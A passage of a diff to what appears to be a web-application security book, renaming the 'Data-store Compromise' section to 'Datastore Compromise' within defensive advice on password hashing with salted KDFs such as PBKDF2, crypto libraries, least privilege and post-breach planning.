+Another notable datastore compromise is [LinkedIn](https://en.wikipedia.org/wiki/2012_LinkedIn_hack) where 6.5 million user accounts where compromised and 95% of the users passwords cracked within days. Why so fast? Because they used simple hashing, specifically SHA-1. Also when [EBay](http://www.darkreading.com/attacks-breaches/ebay-database-hacked-with-stolen-employee-credentials-/d/d-id/1269093) got hacked affecting their 145 million active buyers. Many others coming to light regularly.
 
 Are you using well salted and quality strong key derivation functions (KDFs) for all of your sensitive data? Are you making sure you are notifying your customers about using high quality passwords? Are you informing them what a high quality password is? Consider checking new user credentials against a list of the most frequently used and insecure passwords collected. I have discussed Password Lists in the Tooling Setup chapter. You could also use wordlists targeting the most commonly used passwords, or create an algorithm that works out what an easy to guess password looks like, and inform the user that their password would be easy to guess by an attacker.
 
@@ -859,7 +857,7 @@ The following is a list of the best JavaScript crypto libraries we have availabl
   1. AES-CCM. Counter with CBC-MAC (CCM) is a mode of operation for cryptographic block ciphers of 128 bits in length. It is an authenticated encryption algorithm designed to provide both authentication and confidentiality
   2. AES-OCB2. [Offset CodeBook (OCB)](https://en.wikipedia.org/wiki/OCB_mode) is also a mode of operation for cryptographic block ciphers of 128 bits in length. OCB2 is an authenticated encryption algorithm designed to provide both authentication and confidentiality. OCB1 didn't allow associated data to be included with the message. Integrity verification is now part of the decryption step with OCB2. GCM is similar to OCB, but GCM and CCM doesn't have any patents. Although exemptions have been granted, so that OCB can be used in software licensed under the GNU General Public License  
   
-  * Uses PBKDF2 for One way hashing of passwords. More details around password hashing in the [Data-store Compromise](#web-applications-countermeasures-data-store-compromise) section.
+  * Uses PBKDF2 for One way hashing of passwords. More details around password hashing in the [Datastore Compromise](#web-applications-countermeasures-data-store-compromise) section.
 * **Forge**
   * Source Code: [https://github.com/digitalbazaar/forge](https://github.com/digitalbazaar/forge)
   * NPM package: [https://www.npmjs.com/package/node-forge](https://www.npmjs.com/package/node-forge)  
@@ -3474,7 +3472,7 @@ Put your services like data-stores on network segments that are as [sheltered](#
 
 Maintain as few user accounts on the servers in question as possible and with the least privileges as possible. 
 
-#### Data-store Compromise {#web-applications-countermeasures-data-store-compromise}
+#### Datastore Compromise {#web-applications-countermeasures-data-store-compromise}
 ![](images/ThreatTags/PreventionEASY.png)
 
 As part of your defence in depth strategy, you should expect that your data-store is going to get stolen, but hope that it does not. You should be thinking about what assets within the data-store are sensitive? How are you going to stop an attacker that has gained access to the data-store make sense of the sensitive data?
@@ -3715,7 +3713,7 @@ Some note worthy benefits I've found with MembershipReboot are:
         }
         
 2. The security focussed [configuration](https://github.com/brockallen/BrockAllen.MembershipReboot/wiki/Security-Settings-Configuration). You can choose to set this within code or config.  
-Password storage (as discussed above under the [Data-store Compromise](#web-applications-countermeasures-data-store-compromise) section is [addressed](http://brockallen.com/2014/02/09/how-membershipreboot-stores-passwords-properly/) by using the mature PBKDF2 and providing a config setting in the form of `passwordHashingIterationCount` on the `MembershipRebootConfiguration` class to dial in the number of iterations (stretching), as seen below on line 29. This provides us with what's known as an adaptive one-way function. Adaptive because the workload increases each year to keep up with advances in hardware technology. You now have control of how slow you want it to be to crack those passwords. What's more, the iteration count can be set to change each year automatically. If the developer chooses not to touch the iteration count at all (or more likely, forgets), then the default of 0 is inferred. 0 means to automatically calculate the number based on the [OWASP recommendations](https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet) for the current year. In the year 2000 it should be 1000 iterations. The count should be doubled each subsequent two years, so in 2016 we should be using 256000 iterations and that's what MembershipReboot does if the setting is not changed.
+Password storage (as discussed above under the [Datastore Compromise](#web-applications-countermeasures-data-store-compromise) section is [addressed](http://brockallen.com/2014/02/09/how-membershipreboot-stores-passwords-properly/) by using the mature PBKDF2 and providing a config setting in the form of `passwordHashingIterationCount` on the `MembershipRebootConfiguration` class to dial in the number of iterations (stretching), as seen below on line 29. This provides us with what's known as an adaptive one-way function. Adaptive because the workload increases each year to keep up with advances in hardware technology. You now have control of how slow you want it to be to crack those passwords. What's more, the iteration count can be set to change each year automatically. If the developer chooses not to touch the iteration count at all (or more likely, forgets), then the default of 0 is inferred. 0 means to automatically calculate the number based on the [OWASP recommendations](https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet) for the current year. In the year 2000 it should be 1000 iterations. The count should be doubled each subsequent two years, so in 2016 we should be using 256000 iterations and that's what MembershipReboot does if the setting is not changed.
     
     {title="backend\\Auth\\AuthService.WebApi\\app.config", linenos=on, lang=XML}
         <!--Lives in Auth Service of Architecture diagram below.-->
@@ -4775,7 +4773,7 @@ Applying least privilege to everything can take quite a bit of work. Yes, it is 
 
 Segmentation is useful, and a common technique in helping to build resistance against attacks. It does introduce some complexity though. With complexity comes the added likely-hood of introducing a fault. 
 
-#### Data-store Compromise
+#### Datastore Compromise
 
 If you follow the advice in the [countermeasures](#web-applications-countermeasures-data-store-compromise) section, you will be doing more than most other organisations in this area. It is not hard, but if implemented it could increase complacency/over confidence. Always be on your guard. Always expect that although you have done a lot to increase your security stance, a determined and experienced attacker is going to push buttons you may have never realised you had. If they want something enough and have the resources and determination to get it, they probably will. This is where you need to put strategies in place to deal with post compromise. Create processes (ideally partly automated) to deal with theft.
 
@@ -4949,7 +4947,7 @@ Is something you should be at least considering and probably doing in every case
 
 Segmenting of resources is a common and effective measure to take for at least slowing down attacks and a cost well worth considering if you have not already.
 
-#### Data-store Compromise
+#### Datastore Compromise
 
 The countermeasures discussed here go without saying, although many organisations do not do them well, if at all. It is up to you whether you want to be one of the statistics that has all of their secrets revealed. Following the countermeasures here is something that just needs to be done if you have any data that is sensitive in your data-store(s). 
 
